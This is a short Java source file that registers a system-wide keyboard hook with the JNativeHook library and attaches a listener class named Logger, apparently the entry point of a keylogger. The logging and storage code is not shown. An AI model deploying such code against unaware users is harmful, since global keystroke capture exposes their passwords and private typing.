import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {
    public static void main(String[] args) {
        String s = String.format("%x",(int)(Math.random()*2147483647));
        System.out.println(s);
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Logger());
    }
}
